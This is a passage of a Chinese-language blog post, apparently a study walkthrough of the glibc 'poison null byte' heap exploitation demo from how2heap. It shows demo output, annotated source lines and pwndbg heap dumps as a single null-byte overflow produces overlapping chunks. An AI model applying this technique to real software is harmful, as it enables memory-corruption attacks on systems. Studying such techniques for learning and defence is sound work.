class="hljs-keyword">when</span> you have an off-by-one into a malloc<span class="hljs-symbol">&#x27;ed</span> region <span class="hljs-keyword">with</span> a <span class="hljs-keyword">null</span> byte.<br>We allocate <span class="hljs-number">0</span>x100 bytes <span class="hljs-keyword">for</span> <span class="hljs-symbol">&#x27;a</span>&#x27;.<br>a: <span class="hljs-number">0</span>x241a010<br>Since we want <span class="hljs-keyword">to</span> overflow <span class="hljs-symbol">&#x27;a</span>&#x27;, we need <span class="hljs-keyword">to</span> know the <span class="hljs-symbol">&#x27;real</span>&#x27; size <span class="hljs-keyword">of</span> <span class="hljs-symbol">&#x27;a</span>&#x27; (it may be more than <span class="hljs-number">0</span>x100 because <span class="hljs-keyword">of</span> rounding): <span class="hljs-number">0</span>x108<br>b: <span class="hljs-number">0</span>x241a120<br>c: <span class="hljs-number">0</span>x241a330<br>We allocate a barrier at <span class="hljs-number">0</span>x241a440, so that c <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> consolidated <span class="hljs-keyword">with</span> the top-chunk <span class="hljs-keyword">when</span> freed.<br>The barrier <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> strictly necessary, but makes things less confusing<br><span class="hljs-keyword">In</span> newer versions <span class="hljs-keyword">of</span> glibc we will need <span class="hljs-keyword">to</span> have our updated size inside b itself <span class="hljs-keyword">to</span> pass the check <span class="hljs-symbol">&#x27;chunksize</span>(P) != prev_size (next_chunk(P))&#x27;<br>b.size: <span class="hljs-number">0</span>x211<br>b.size <span class="hljs-keyword">is</span>: (<span class="hljs-number">0</span>x200 + <span class="hljs-number">0</span>x10) | prev_in_use<br>We overflow <span class="hljs-symbol">&#x27;a</span>&#x27; <span class="hljs-keyword">with</span> a single <span class="hljs-keyword">null</span> byte into the metadata <span class="hljs-keyword">of</span> <span class="hljs-symbol">&#x27;b</span>&#x27;<br>b.size: <span class="hljs-number">0</span>x200<br>c.prev_size <span class="hljs-keyword">is</span> <span class="hljs-number">0</span>x210<br>We will pass the check since chunksize(P) == <span class="hljs-number">0</span>x200 == <span class="hljs-number">0</span>x200 == prev_size (next_chunk(P))<br>b1: <span class="hljs-number">0</span>x241a120<br>Now we malloc <span class="hljs-symbol">&#x27;b1</span>&#x27;. It will be placed where <span class="hljs-symbol">&#x27;b</span>&#x27; was. At this point c.prev_size should have been updated, but it was <span class="hljs-keyword">not</span>: <span class="hljs-number">0</span>x210<br>Interestingly, the updated value <span class="hljs-keyword">of</span> c.prev_size has been written <span class="hljs-number">0</span>x10 bytes before c.prev_size: f0<br>We malloc <span class="hljs-symbol">&#x27;b2</span>&#x27;, our <span class="hljs-symbol">&#x27;victim</span>&#x27; chunk.<br>b2: <span class="hljs-number">0</span>x241a230<br>Current b2 content:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>Now we free <span class="hljs-symbol">&#x27;b1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-symbol">&#x27;c</span>&#x27;: this will consolidate the chunks <span class="hljs-symbol">&#x27;b1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-symbol">&#x27;c</span>&#x27; (forgetting about <span class="hljs-symbol">&#x27;b2</span>&#x27;).<br>Finally, we allocate <span class="hljs-symbol">&#x27;d</span>&#x27;, overlapping <span class="hljs-symbol">&#x27;b2</span>&#x27;.<br>d: <span class="hljs-number">0</span>x241a120<br>Now <span class="hljs-symbol">&#x27;d</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-symbol">&#x27;b2</span>&#x27; overlap.<br><span class="hljs-keyword">New</span> b2 content:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br>Thanks <span class="hljs-keyword">to</span> https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation <span class="hljs-keyword">of</span> this technique.<br></code></pre></td></tr></table></figure><h2 id="关键代码调试"><a href="#关键代码调试" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>本例9个断点分别断在:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">40</span>   barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>► <span class="hljs-number">41</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br>  <span class="hljs-number">42</span>           <span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br>  <span class="hljs-number">56</span>   <span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br>► <span class="hljs-number">57</span>   <span class="hljs-built_in">free</span>(b);<br><br>  <span class="hljs-number">58</span><br>► <span class="hljs-number">59</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>  <span class="hljs-number">62</span>   a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br>► <span class="hljs-number">63</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>  <span class="hljs-number">77</span>   b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-number">78</span><br>► <span class="hljs-number">79</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><br>  <span class="hljs-number">87</span>   b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>► <span class="hljs-number">88</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br>  <span class="hljs-number">95</span>  <span class="hljs-built_in">free</span>(b1);<br>  <span class="hljs-number">96</span>  <span class="hljs-built_in">free</span>(c);<br>  <span class="hljs-number">97</span><br>► <span class="hljs-number">98</span>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br><br>  <span class="hljs-number">99</span>  d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br>► <span class="hljs-number">100</span>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br>  <span class="hljs-number">103</span>  <span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br>  <span class="hljs-number">104</span><br>► <span class="hljs-number">105</span>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br></code></pre></td></tr></table></figure><p>下面我们开始调试</p><p>首先是分配了chunk a,b,c,barrier</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603110</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">529</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603320</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603430</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">273</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603540</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">133825</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后程序修改了b+0x1f0位为0x200,也就是</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; p/x <span class="hljs-number">0x603120</span>+<span class="hljs-number">0</span>x1f0<br>$<span class="hljs-number">4</span> = <span class="hljs-number">0x603310</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603310</span><br><span class="hljs-number">0x603310</span>:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000200</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603320</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000111</span><br><span class="hljs-number">0x603330</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603340</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603350</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>好了,下面我们继续,此时程序已经释放了b</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603110 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">529</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603320 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">528</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">272</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603430 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603540 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">133825</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x603110 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603110<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>之后,程序将a[real_a_size]修改为了0x00,也就是将我们的b的size改为了0x200,(为了通过前文所说的check)此时的堆</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603110 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">512</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603310 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">512</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x210,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x110,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x603110 —▸ <span class="hljs-number">0</span>x7ffff7dd1b78 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span>) ◂— <span class="hljs-number">0</span>x603110<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到,随着b的size被覆盖为了0x200,c的pre_size也变成了0x200</p><p>之后我们再次调用malloc的时候,因为b被视为为free态,此时会调用unlink</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603110 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">273</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1d68 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">584</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1d68 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">584</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603220 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">241</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1b78 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">88</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603310 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">240</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x210,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x110,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span 